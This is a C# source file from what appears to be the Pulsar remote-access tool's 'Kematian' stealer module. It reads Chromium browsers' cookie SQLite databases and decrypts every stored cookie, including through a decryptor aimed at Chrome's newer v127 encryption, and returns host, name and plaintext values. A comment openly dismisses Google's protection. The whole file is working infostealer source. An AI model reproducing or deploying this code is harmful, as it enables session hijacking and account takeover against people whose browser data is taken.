using Pulsar.Client.Kematian.Browsers.Helpers.SQL;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using Pulsar.Client.Kematian.HelpingMethods.Decryption;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;


namespace Pulsar.Client.Kematian.Browsers.Chromium.Cookies
{
    public class CookiesChromium
    {
        public static List<CookieData> GetCookies(string cookiePath, string localstate)
        {
            var cookies = new List<CookieData>();
            if (!File.Exists(cookiePath))
            {
                return cookies;
            }

            if (cookiePath.Contains("Google\\Chrome\\User Data"))
            {
                // Google has the new encryption shit, but we dont give a fuck
                var decrypter = new ChromiumV127Decryptor(localstate);
                return GetCookiesWithDecryptor(cookiePath, decrypter);
            }
            else
            {
                var decrypter = new ChromiumDecryptor(localstate);
                return GetCookiesWithDecryptor(cookiePath, decrypter);
            }
        }

        private static List<CookieData> GetCookiesWithDecryptor(string cookiePath, object decryptor)
        {
            var cookies = new List<CookieData>();

            SQLiteHandler sqlDatabase;
            try
            {
                sqlDatabase = new SQLiteHandler(cookiePath);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to open SQLite database: {ex.Message}");
                return cookies;
            }
            if (!sqlDatabase.ReadTable("cookies"))
            {
                Debug.WriteLine("Failed to read 'cookies' table from database.");
                return cookies;
            }
            for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
            {
                try
                {
                    var host_key = sqlDatabase.GetValue(i, "host_key");
                    var path = sqlDatabase.GetValue(i, "path");
                    var expires_utc = sqlDatabase.GetValue(i, "expires_utc");
                    var name = sqlDatabase.GetValue(i, "name");
                    var encrypted_value = sqlDatabase.GetValue(i, "encrypted_value");

                    string decrypted_value;
                    if (decryptor is ChromiumV127Decryptor chromeDecryptor)
                    {
                        decrypted_value = chromeDecryptor.Decrypt(encrypted_value);
                    }
                    else
                    {
                        decrypted_value = ((ChromiumDecryptor)decryptor).Decrypt(encrypted_value);
                    }

                    cookies.Add(new CookieData(host_key, path, expires_utc, name, decrypted_value));
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Failed to retrieve cookie data from database: {ex.Message}");
                }
            }
            
            return cookies;
        }
    }
}
